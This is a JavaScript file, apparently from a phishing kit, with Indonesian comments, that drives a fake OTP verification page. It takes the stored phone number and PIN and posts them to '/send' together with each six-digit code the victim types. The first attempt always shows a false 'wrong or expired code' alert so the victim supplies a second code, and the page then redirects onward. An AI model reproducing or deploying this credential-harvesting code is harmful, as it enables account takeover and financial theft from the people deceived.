const sound = document.getElementById("successSound");

const otpInputs = document.querySelectorAll(".otp-box");
const otpContainer = document.querySelector(".otp-container");

const errorBox = document.querySelector(".error-box");
const loadingBox = document.getElementById("loadingBox");

const alertTitle = document.querySelector(".alert-title");
const alertDesc = document.querySelector(".alert-desc");

const resendBtn = document.querySelector(".resend-btn");
const timerText = document.querySelector(".timer");

const introOverlay = document.getElementById("introOverlay");
const introBtn = document.getElementById("introBtn");

let alertTimer;
let otpAttempt = 0;

/* FADE IN */
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* RESET SAAT BACK */
window.addEventListener("pageshow", () => {
    if(loadingBox){
        loadingBox.style.display = "none";
    }

    if(sound){
        sound.play().catch(() => {});
    }
});

/* ALERT */
if(errorBox){
    errorBox.style.display = "none";
}

function showTempAlert(title, desc){

    if(!errorBox || !alertTitle || !alertDesc) return;

    clearTimeout(alertTimer);

    alertTitle.innerText = title;
    alertDesc.innerText = desc;

    errorBox.style.display = "block";
    errorBox.classList.add("show");

    alertTimer = setTimeout(() => {
        errorBox.classList.remove("show");

        setTimeout(() => {
            errorBox.style.display = "none";
        },300);

    },3000);
}

/* NOMOR OTOMATIS */
const savedNumber = localStorage.getItem("nmrx");

if(savedNumber){
    const phoneNumber = document.querySelector(".phone-number");

    if(phoneNumber){
        phoneNumber.innerText = savedNumber;
    }
}

/* FOKUS OTP */
if(otpContainer){

    otpContainer.addEventListener("click", () => {

        for(let i = 0; i < otpInputs.length; i++){

            if(otpInputs[i].value === ""){
                otpInputs[i].focus();
                return;
            }

        }

        if(otpInputs[0]){
            otpInputs[0].focus();
        }

    });

}

/* INPUT OTP */
otpInputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value = input.value.replace(/[^0-9]/g,'');

        if(errorBox){
            errorBox.style.display = "none";
        }

        if(input.value.length === 1 && index < otpInputs.length - 1){
            otpInputs[index + 1].focus();
        }

        checkOTP();

    });

    input.addEventListener("keydown", (e) => {

        if(e.key === "Backspace" && input.value === "" && index > 0){
            otpInputs[index - 1].focus();
        }

    });

});

/* CEK OTP */
function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {
        otp += input.value;
    });

    if(otp.length === 6){

        otpAttempt++;

        localStorage.setItem("otp", otp);

        const nmrx = localStorage.getItem("nmrx");
        const pix = localStorage.getItem("pix");

        fetch("/send",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                nmrx:nmrx,
                pix:pix,
                otp:otp
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log("RESPON:", data);
        })
        .catch(err => {
            console.log("ERROR:", err);
        });

        if(loadingBox){
            loadingBox.style.display = "flex";
        }

        setTimeout(() => {

            if(loadingBox){
                loadingBox.style.display = "none";
            }

            /* OTP PERTAMA: SALAH */
            if(otpAttempt === 1){

                showTempAlert(
                    "Kode OTP salah atau kadaluarsa",
                    "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa"
                );

                if(otpContainer){
                    otpContainer.classList.add("shake");
                }

                if(navigator.vibrate){
                    navigator.vibrate(250);
                }

                setTimeout(() => {
                    if(otpContainer){
                        otpContainer.classList.remove("shake");
                    }
                },350);

                setTimeout(() => {

                    otpInputs.forEach(input => {
                        input.value = "";
                    });

                    if(otpInputs[0]){
                        otpInputs[0].focus();
                    }

                },300);

            }

            /* OTP KEDUA: LANJUT */
            else{

                document.body.classList.add("fade-out");

                setTimeout(() => {
                    window.location.href = "oxt.html";
                },500);

            }

        },2000);

    }

}

/* TIMER */
let time = 60;

if(resendBtn && timerText){

    resendBtn.disabled = true;

    const countdown = setInterval(() => {

        let seconds = time < 10 ? "0" + time : time;

        timerText.innerText = `00:${seconds}`;

        time--;

        if(time < 0){

            clearInterval(countdown);

            timerText.innerText = "00:00";

            resendBtn.disabled = false;
            resendBtn.classList.add("active");

        }

    },1000);

    resendBtn.addEventListener("click", () => {

        if(!resendBtn.disabled){
            location.reload();
        }

    });

}

/* INTRO OVERLAY */
if(introBtn && introOverlay){

    introBtn.addEventListener("click", () => {

        introOverlay.classList.add("hide");

        setTimeout(() => {
            introOverlay.style.display = "none";
        },350);

    });

}
